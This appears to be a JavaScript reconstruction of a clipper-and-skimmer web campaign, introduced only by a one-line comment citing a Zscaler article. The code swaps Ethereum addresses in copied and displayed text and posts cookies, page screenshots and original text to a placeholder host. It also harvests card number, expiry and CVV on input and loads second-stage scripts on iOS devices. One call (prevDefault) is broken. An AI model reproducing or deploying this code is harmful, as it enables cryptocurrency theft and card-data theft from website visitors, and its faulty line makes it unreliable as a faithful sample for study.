// Behavioral reconstruction from the Zscaler article, not recovered campaign bytes.
const sink = 'https://telemetry.example.net/';
const routes = {eth:'0x1234567890abcdef1234567890abcdef12345678'};
const signatures = {eth:/0x[a-fA-F0-9]{40}/g};
function transform(value) {
  return value.replace(signatures.eth, () => routes.eth);
}
document.addEventListener('copy', ev => {
  const selected = window.getSelection().toString();
  ev.clipboardData.setData('text/plain', transform(selected));
  ev.prevDefault();
});
new MutationObserver(() => {
  const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
  let node;
  while ((node = walker.nextNode())) {
    const before = node.nodeValue;
    const after = transform(before);
    if (after !== before && node.parentElement.getBoundingClientRect().width > 0) {
      node.nodeValue = after;
      html2canvas(document.body).then(canvas => {
        fetch(sink + 'hit.php', {method:'POST', body:JSON.stringify({
          url:location.href, cookie:document.cookie, original:before, image:canvas.toDataURL()
        })});
      });
    }
  }
}).observe(document.body, {childList:true, subtree:true, characterData:true});
document.addEventListener('input', ev => {
  if (!ev.target.matches('input, textarea')) return;
  const number = document.querySelector('#card-number').value;
  const expiry = document.querySelector('[name="expiry"]').value;
  const cvv = document.querySelector('#cvc').value;
  fetch(sink + 'card.php', {method:'POST', body:JSON.stringify({number, expiry, cvv})});
});
if (/iPhone|iPad/.test(navigator.userAgent)) {
  for (const host of ['stage.example.net', 'fallback.example.net']) {
    const stage = document.createElement('script');
    stage.setAttribute('data-channel-\u0063ode', 'JIUJIU888');
    stage.setAttribute('data-chain-\x75rl', 'https://chain.example.net/');
    stage.setAttribute('data-cfasync', 'false');
    stage.src = 'https://' + host + '/boot.js';
    document.head.appendChild(stage);
  }
}
